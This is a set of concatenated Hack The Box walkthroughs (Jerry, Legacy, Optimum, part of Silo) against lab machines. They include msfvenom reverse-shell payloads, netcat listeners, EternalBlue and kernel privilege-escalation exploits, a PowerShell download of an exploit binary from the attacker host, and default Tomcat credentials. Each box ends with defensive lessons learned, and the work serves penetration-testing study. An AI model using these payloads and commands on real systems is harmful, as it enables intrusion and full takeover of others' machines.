Then use the “_run_” command to start the reverse tcp handler. In the browser, execute the _met-shell.aspx_ payload and wait for a session to open up in Metasploit.

![](https://miro.medium.com/max/1035/1*8qr962N2EhGfjSOYVE1zSA.png)

Perfect! Next, use the local exploit suggester module to see which exploits the system is vulnerable to.

![](https://miro.medium.com/max/1189/1*NHjcuWBAByttFKC56LVZuQ.png)

We’ll go with the second one MS14–058.

```text
use exploit/windows/local/ms14_058_track_popup_menu
set session 1
run
```

It opens up another session.

![](https://miro.medium.com/max/1088/1*2gb6IknR6r5uGZ18RQnfow.png)

Let’s see what privilege we’re running with.

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We’re system! Grab the _user.txt_ flag.

![](https://miro.medium.com/max/834/1*6ehYuARyQtTTL5sY_QjK9w.png)

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/967/1*w1tvAMKHwoB18O8KkeFQ7g.png)

## Lessons Learned <a id="a815"></a>

To gain an initial foothold on the box we exploited one vulnerability.

1. Insecure configuration of the web server that allowed us to upload arbitrary files using the HTTP methods ‘PUT’ and ‘MOVE’. This would have been avoided if these methods were disabled.

To escalate privileges we exploited one vulnerability.

1. Kernel vulnerability in the outdated operating system that was being used. This could have been avoided if the OS was patched.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
jerry-writeup-w-o-metasploit.md
# Jerry Writeup w/o Metasploit

![](https://miro.medium.com/max/590/1*6vyFg1efjSxOXiLaY5BQtA.png)

## Reconnaissance <a id="b0d4"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.95 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.95Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:01 EST
Nmap scan report for 10.10.10.95
Host is up (0.043s latency).
Not shown: 999 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
8080/tcp open  http-proxyNmap done: 1 IP address (1 host up) scanned in 6.04 seconds---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:01 EST
Nmap scan report for 10.10.10.95
Host is up (0.16s latency).PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.96 seconds----------------------Starting Nmap UDP Scan----------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:01 EST
Nmap scan report for 10.10.10.95
Host is up.
All 1000 scanned ports on 10.10.10.95 are open|filteredNmap done: 1 IP address (1 host up) scanned in 201.63 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:05 EST
Initiating Parallel DNS resolution of 1 host. at 00:05
Completed Parallel DNS resolution of 1 host. at 00:05, 0.02s elapsed
Initiating SYN Stealth Scan at 00:05
Scanning 10.10.10.95 [65535 ports]
Discovered open port 8080/tcp on 10.10.10.95
.....
Nmap scan report for 10.10.10.95
Host is up (0.041s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxyRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 262.85 seconds
           Raw packets sent: 131271 (5.776MB) | Rcvd: 324 (33.413KB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on basic ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:09 EST
/usr/local/bin/nmapAutomator.sh: line 226:  2536 Segmentation fault      $nmapType -sV --script vulners --script-args mincvss=7.0 -p$(echo "${ports}") -oN nmap/CVEs_"$1".nmap "$1"Running Vuln scan on basic ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:09 EST
Nmap scan report for 10.10.10.95
Host is up (0.040s latency).PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
.....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.18 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.95:8080 -o recon/gobuster_10.10.10.95_8080.txt
nikto -host 10.10.10.95:8080 | tee recon/nikto_10.10.10.95_8080.txtWhich commands would you like to run?                                                                                                                                          
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.95:8080
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     php,html
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/20 00:12:20 Starting gobuster
===============================================================
http://10.10.10.95:8080/aux (Status: 200) [Size: 0]
http://10.10.10.95:8080/com2 (Status: 200) [Size: 0]
http://10.10.10.95:8080/com1 (Status: 200) [Size: 0]
http://10.10.10.95:8080/com3 (Status: 200) [Size: 0]
http://10.10.10.95:8080/con (Status: 200) [Size: 0]
http://10.10.10.95:8080/docs (Status: 302) [Size: 0]
http://10.10.10.95:8080/examples (Status: 302) [Size: 0]
http://10.10.10.95:8080/favicon.ico (Status: 200) [Size: 21630]
http://10.10.10.95:8080/host-manager (Status: 302) [Size: 0]
http://10.10.10.95:8080/lpt1 (Status: 200) [Size: 0]
http://10.10.10.95:8080/lpt2 (Status: 200) [Size: 0]
http://10.10.10.95:8080/manager (Status: 302) [Size: 0]
http://10.10.10.95:8080/nul (Status: 200) [Size: 0]
===============================================================
2020/02/20 00:13:08 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
Starting nikto scan
                                                                                                                                                                               
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.95
+ Target Hostname:    10.10.10.95
+ Target Port:        8080
+ Start Time:         2020-02-20 00:13:09 (GMT-5)
--------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7967 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2020-02-20 00:19:31 (GMT-5) (382 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                                               
=========================
                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                               
---------------------Finished all Nmap scans---------------------Completed in 18 minute(s) and 8 second(s)
```

We have one port open.

* **Port 8080:** running Apache Tomcat/Coyote JSP engine 1.1

Before we move on to enumeration, let’s make some mental notes about the scan results.

* Port 8080 is running Apache Tomcat and the nmap scan found the _/manager/html_ page, which is the login page to the Manager interface. The nikto scan identified that this page is using the default credentials _tomcat_/_s3cret_. Apache Tomcat by design allows you to run code, so we can simply deploy a war file that sends a reverse shell back to our attack machine.

Since we already have a way to get code execution on the box, we can just move on to the exploitation phase.

## Exploitation <a id="103d"></a>

Visit the _/manager/html_ page and log in with the credentials _tomcat_/_s3cret_.

![](https://miro.medium.com/max/1262/0*96G4tbEOOt4tJEtC.png)

Generate a war file that contains a reverse shell using msfvenom.

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -f war > shell.war
```

Upload the file on the Tomcat Application Manager and deploy it.

![](https://miro.medium.com/max/779/0*Ux835eO81J5k30zh.png)

Set up a listener on the target machine.

```text
nc -nlvp 1234
```

Click on the war file in the Tomcat Application Manager to execute our shell.

![](https://miro.medium.com/max/898/1*pvM-CqHbJfyGeOeIA1mpxA.png)

We get a shell with SYSTEM privileges! That was easy! We don’t even have to escalate our privileges for this box.

Grab the _user.txt_ and _root.txt_ flags.

![](https://miro.medium.com/max/964/1*HMxNDHZ88LP6-up5-7QdwQ.png)

## Lessons Learned <a id="fbcc"></a>

To get SYSTEM on this box, we exploited two vulnerabilities.

* Use of Default Credentials. There was an exposed port that was running Apache Tomcat. The administrator had used default credentials for the manager interface. This allowed us to access the interface and deploy a war file that gave us access to the server. Since default credentials are publicly available and can be easily obtained, the administrator should have instead used a sufficiently long password that is difficult to crack.
* Least Privilege Violation. Tomcat doesn’t need SYSTEM privileges to function properly. Instead it should have been run under a tomcat user account that has limited privileges. This way, even if we did get access to the box, we would have needed to find a way to escalate privileges, instead of immediately getting SYSTEM access without having to work for it. The administrator should have conformed to the principle of least privilege.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
legacy-writeup-w-o-metasploit.md
# Legacy Writeup w/o Metasploit

![](https://miro.medium.com/max/587/1*lTQ336Aj68RUNHuYjdCE5A.png)

## Reconnaissance <a id="3ccd"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA nmap/initial 10.10.10.4
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that these ports are open:

* **Port 139:** running Microsoft Windows netbiois-ssn.
* **Port 445:** running Windows XP microsoft-ds.

![](https://miro.medium.com/max/1088/1*IUyh9A6LTMxxHZFDqLDJ-A.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.4
```

We get back the following result. No other ports are open.

![](https://miro.medium.com/max/1089/1*eVcfYf1UYWWYSuLHPm1lWw.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA nmap/udp 10.10.10.4
```

We get back the following result. As can be seen, port 137 is open with netbios-ns running on it.

![](https://miro.medium.com/max/842/1*6Z85NaGdaLut4D_mPXlvow.png)

Our initial recon shows that the only point of entry is possibly through exploiting SMB.

## Enumeration <a id="3248"></a>

SMB has had its fair share of vulnerabilities in the past, so let’s first run nmap scripts to determine if it is vulnerable.

```text
nmap -v -script smb-vuln* -p 139,445 10.10.10.4
```

![](https://miro.medium.com/max/1032/1*QDuJY0ngDs-8FdgrNYBaaA.png)

The result shows us that it is vulnerable to CVE-2009–3103 and CVE-2017–0143 and likely vulnerable to CVE-2008–4250. The target machine is running SMBv1 so we’ll go with CVE-2017–0143 \(MS17–010\).

## Exploitation <a id="d6e0"></a>

The vulnerability we’ll be exploiting is called Eternal Blue. This vulnerability exploited Microsoft’s implementation of the Server Message Block \(SMB\) protocol, where if an attacker sent a specially crafted packet, the attacker would be allowed to execute arbitrary code on the target machine.

I came across this [article](https://ethicalhackingguru.com/how-to-exploit-ms17-010-eternal-blue-without-metasploit/) that explains how to exploit the Eternal Blue vulnerability without using Metasploit. We’ll use it to run the exploit on the target machine.

First, download the exploit code from Github.

```text
git clone https://github.com/helviojunior/MS17-010.git
```

Use MSFvenom to create a reverse shell payload \(allowed on the OSCP as long as you’re not using meterpreter\).

```text
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe > eternalblue.exe
```

Start up a listener on your attack machine.

```text
nc -nlvp 4444
```

Run the exploit.

```text
python send_and_execute.py 10.10.10.4 ~/Desktop/eternalblue.exe
```

![](https://miro.medium.com/max/922/1*Alda1JRD2rRuYdtVQebetA.png)

We have a reverse shell!

![](https://miro.medium.com/max/605/1*2gHkz5wfmvtdHyQK-y9gLw.png)

Next, we need to figure out what privileges we are running with.

![](https://miro.medium.com/max/642/1*TluyrrJPkLZVsMGFglzNUg.png)

**Whoami** doesn’t seem to work and we can’t echo the username. Therefore, we’ll have to get creative. Kali has a **whoami** executable that we can import to our target machine.

![](https://miro.medium.com/max/758/1*Ojfn655VnEMs4Fv1qEnbFQ.png)

Both netcat and powershell are not installed on the target machine, so we can’t use them to import the executable. Therefore, let’s try and setup an SMB server for the transfer.

Locate the SMB server script on kali.

![](https://miro.medium.com/max/609/1*qgbBM40SQzWr8k7xvCKHug.png)

Run the script to launch an SMB server on port 445 with the share name _temp_ and the path to the whoami executable.

```text
sudo /usr/share/doc/python-impacket/examples/smbserver.py temp /usr/share/windows-binaries/
```

![](https://miro.medium.com/max/955/1*xNqDs4gYn8apG5g6E2R1Sw.png)

Verify that script ran correctly by accessing the SMB share.

```text
smbclient //10.10.14.6/temp
```

List the content of the directory.

![](https://miro.medium.com/max/819/1*BLx78KtaOD7QV8G-_5mObQ.png)

In the target machine, you can now execute the whoami command using the temp share.

```text
\\10.10.14.6\temp\whoami.exe
```

![](https://miro.medium.com/max/541/1*usNmdlrHuOjrDx_BxFqmTg.png)

We have SYSTEM! We don’t need to escalate privileges for this box.

Grab the user flag.

![](https://miro.medium.com/max/645/1*GNs8Y_VHjws5cZz9ka8iKA.png)

Grab the root flag.

![](https://miro.medium.com/max/649/1*tW2RsJnMZIsDozzq6WIm1w.png)

## Lessons Learned <a id="a30a"></a>

This was a relatively simple machine to solve. It was running a vulnerable outdated version of SMB. So far, I’ve solved four machine and each one of them required me to exploit a vulnerable version of some software to either gain a foothold on the machine or to escalate privileges. So it goes without saying that you should always update your systems **especially** when updates are released for critical vulnerabilities! If the user had installed the MS17–010 security update, I would have had to find another way to exploit this machine.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
optimum-writeup-w-o-metasploit.md
# Optimum Writeup w/o Metasploit

![](https://miro.medium.com/max/577/1*NKZJ6g5IrMlmin0odn-nQw.png)

## Reconnaissance <a id="8798"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA nmap/initial 10.10.10.8
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that only one port is open:

* **Port 80:** running HttpFileServer httpd 2.3.

![](https://miro.medium.com/max/875/1*k9L7TrK7W6-VnZMQawgfcA.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.8
```

We get back the following result. No other ports are open.

![](https://miro.medium.com/max/875/1*ga9SWu1zvxTkW9Vc4vO3Uw.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA nmap/udp 10.10.10.8
```

We get back the following result.

![](https://miro.medium.com/max/820/1*AtOzEE85ZI8b_DN1Sc77MA.png)

Our initial recon shows that our only point of entry is through exploiting the HTTP File Server.

## Enumeration <a id="f550"></a>

Browse to the HTTP File server.

![](https://miro.medium.com/max/715/1*aCNfEc0EKBA3n4lxbDv-9w.png)

It seems to be a server that allows you to remotely access your files over the network. There’s a login page that might be using default credentials. This could potentially allow us to gain an initial foothold. Let’s google the server name and version to learn more about it.

![](https://miro.medium.com/max/780/1*0RMMOpk5wDXeUUM4zknTZw.png)

The first two google entries are publicly disclosed exploits that would give us remote code execution on the box!

Click on the first entry and view the compile instructions.

![](https://miro.medium.com/max/1189/1*w4ypNwoGT8Wa9lNAjPYHUA.png)

To compile the exploit, we need to perform a few tasks:

1. Host a web server on our attack machine \(kali\) on port 80 in a directory that has the netcat executable file.
2. Start a netcat listener on the attack machine.
3. Download the exploit and change the _ip\_addr_ & _local\_port_ variables __in the script to match the ip address of the attack machine and the port that netcat is listening on.
4. Run the script using python as stated in the _Usage_ comment.

Before we do that, let’s try and understand what the script is doing.

![](https://miro.medium.com/max/804/1*CVvuM4vFmi6wv9MjzpuGSg.png)

Everything in yellow \(in double quotes\) is URL encoded. Let’s decode it using an [online encoder/decoder](https://meyerweb.com/eric/tools/dencoder/).

![](https://miro.medium.com/max/782/1*U36Uah44TmAUC7NwFajP0g.png)

Three functions are being called:

* **script\_create\(\):** creates a script \(_script.vbs_\) that when run downloads the nc.exe from our attack machine and saves it to the _C:\Users\Public\_ location on the target machine.
* **execute\_script\(\):** uses the _csscript.exe_ \(command-line version of the Windows Script Host that provides command-line options for setting script properties\) to run _script.vbs_.
* **nc\_run\(\):** runs the the netcat executable and sends a reverse shell back to our attack machine.

Now that we understand what the script is doing, what remains to be answered is why was remote code execution allowed. Further googling tells us the [reason](https://nvd.nist.gov/vuln/detail/CVE-2014-6287).

> The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server \(aks HFS or HttpFileServer\) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.

This makes sense. In the exploit, every time a search is done to run arbitrary code, the _%00_ sequence is used.

## Gaining an Initial Foothold <a id="4a01"></a>

Now that we understand the exploit, let’s run it. In the instructions, the first step is to host a web server on our attack machine \(kali\) on port 80 in a directory that has the netcat executable file.

Locate the Windows netcat executable file in the kali vm.

![](https://miro.medium.com/max/467/1*Qtf_ISBvJObLkgELGf6mmQ.png)

Copy it to the location where the server will be run.

```text
cp nc.exe ~/Desktop/
```

Start the HTTP server.

```text
python -S SimpleHTTPServer
```

The second step is to start a netcat listener on the attack machine.

```text
nc -nlvp 5555
```

The third step is to download the exploit and change the _ip\_addr_ & _local\_port_ variables __in the script to match the ip address of the attack machine and the port that netcat is listening on.

![](https://miro.medium.com/max/875/1*REj-uG7hpQC1kwqs8X3LsQ.png)

![](https://miro.medium.com/max/573/1*P2tOnHK8w5U6R_WZdJoG-Q.png)

The fourth step is to run the exploit.

```text
python 39161.py 10.10.10.8 80
```

We get a non-privileged shell back!

![](https://miro.medium.com/max/569/1*cf31JomNi-3VN4L2ezT7tQ.png)

Grab the user flag.

![](https://miro.medium.com/max/521/1*PQ7nJqA9EYMd6flmEDtzzA.png)

We don’t have system privileges, so we’ll need to find a way to escalate privileges.

## Privilege Escalation <a id="4f80"></a>

We’ll use [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) to identify any missing patches on the Windows target machine that could potentially allow us to escalate privileges.

First, download the script.

```text
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
```

Next, install the dependencies specified in the readme document.

```text
pip install xlrd --upgrade
```

Update the database.

```text
./windows-exploit-suggester.py --update
```

This creates an excel spreadsheet form the Microsoft vulnerability database in the working directory.

The next step is to retrieve the system information from the target machine. This can be done using the “systeminfo” command.

![](https://miro.medium.com/max/919/1*-p8vBM7H9aIjum8m1YaOQQ.png)

Copy the output and save it in a text file “sysinfo.txt” in the Windows Exploit Suggester directory on the attack machine. Then run the following command on the attack machine.

```text
./windows-exploit-suggester.py --database 2019-10-05-mssb.xls --systeminfo sysinfo.txt
```

![](https://miro.medium.com/max/1158/1*FavOCVu4GBX53wndAx_BqQ.png)

The Windows OS seems to be vulnerable to many exploits! Let’s try MS16–098. In the [exploit database](https://www.exploit-db.com/exploits/41020), it gives you a link to a precompiled executable. Download the executable on the attack machine.

```text
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
```

Now we need to transfer it to the target machine. Start up an HTTP server on attack machine in the same directory that the executable file is in.

```text
python -m SimpleHTTPServer 9005
```

In target machine download the file in a directory you have write access to.

```text
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:9005/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"
```

Run the exploit.

![](https://miro.medium.com/max/657/1*rJz8daK8zkXt4ttTTZOqAg.png)

We have system! Grab the root flag.

![](https://miro.medium.com/max/463/1*yvwdKYtBc1geIU5UwobxGA.png)

## Lesson Learned <a id="41f2"></a>

Always update and patch your software! To gain both an initial foothold and escalate privileges, we leveraged publicly disclosed vulnerabilities that have security updates and patches available.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
silo-writeup-w-o-metasploit.md
# Silo Writeup w/o Metasploit

![](https://miro.medium.com/max/592/1*TTpmMHhQNAq0jq0i6J8HXA.png)

## Reconnaissance <a id="5c97"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.82 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.82Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 11:51 EST
Warning: 10.10.10.82 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.82
Host is up (0.042s latency).
Not shown: 507 closed ports, 481 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1521/tcp  open  oracle
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 9.36 seconds---------------------Starting Nmap Basic Scan---------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 11:52 EST
Nmap scan report for 10.10.10.82
Host is up (0.13s latency).PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:
|_clock-skew: mean: 2m11s, deviation: 0s, median: 2m11s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-23T16:56:29
|_  start_date: 2020-02-23T16:53:39Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.13 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 11:54 EST
Warning: 10.10.10.82 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.82
Host is up (0.19s latency).
All 1000 scanned ports on 10.10.10.82 are closed (682) or open|filtered (318)Nmap done: 1 IP address (1 host up) scanned in 957.01 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 12:10 EST
Initiating Parallel DNS resolution of 1 host. at 12:10
Completed Parallel DNS resolution of 1 host. at 12:10, 0.03s elapsed
.....
Nmap scan report for 10.10.10.82
Host is up (0.043s latency).
Not shown: 64150 closed ports, 1370 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1521/tcp  open  oracle
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown
49162/tcp open  unknownRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 237.23 seconds
           Raw packets sent: 89983 (3.959MB) | Rcvd: 85386 (3.416MB)Making a script scan on extra ports: 5985, 47001, 49162
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 12:14 EST
Nmap scan report for 10.10.10.82
Host is up (0.47s latency).PORT      STATE SERVICE VERSION
5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49162/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.68 seconds---------------------Starting Nmap Vulns Scan---------------------
                                                                                               
Running CVE scan on all ports
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 12:15 EST
Nmap scan report for 10.10.10.82
Host is up (0.17s latency).PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.10 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.82:80 -o recon/gobuster_10.10.10.82_80.txt
nikto -host 10.10.10.82:80 | tee recon/nikto_10.10.10.82_80.txtgobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.82:5985 -o recon/gobuster_10.10.10.82_5985.txt
nikto -host 10.10.10.82:5985 | tee recon/nikto_10.10.10.82_5985.txtgobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.82:47001 -o recon/gobuster_10.10.10.82_47001.txt
nikto -host 10.10.10.82:47001 | tee recon/nikto_10.10.10.82_47001.txtSMB Recon:
                                                                                               
smbmap -H 10.10.10.82 | tee recon/smbmap_10.10.10.82.txt
smbclient -L "//10.10.10.82/" -U "guest"% | tee recon/smbclient_10.10.10.82.txt
nmap -Pn -p445 --script vuln -oN recon/SMB_vulns_10.10.10.82.txt 10.10.10.82Oracle Recon "Exc. from Default":
                                                                                               
cd /opt/odat/;#10.10.10.82;
./odat.py sidguesser -s 10.10.10.82 -p 1521
./odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/accounts-multiple.txt
cd -;#10.10.10.82;Which commands would you like to run?                                                          
All (Default), gobuster, nikto, nmap, odat, smbclient, smbmap, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                               
===============================================================
Gobuster v3.0.1
